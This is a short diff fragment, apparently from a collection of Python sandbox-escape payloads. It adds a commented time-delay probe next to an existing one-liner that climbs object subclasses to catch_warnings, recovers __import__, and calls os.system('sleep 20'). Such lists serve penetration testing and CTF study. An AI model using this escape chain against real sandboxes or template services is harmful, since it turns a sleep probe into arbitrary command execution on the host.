@@ -202,6 +202,7 @@ __builtins__['__import__']('time').sleep(20)
 # compressed command
 # i=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)['__import__']
 # i('os').system('sleep 20')
+# i('time').sleep(20)
 
 
 # 2 : 
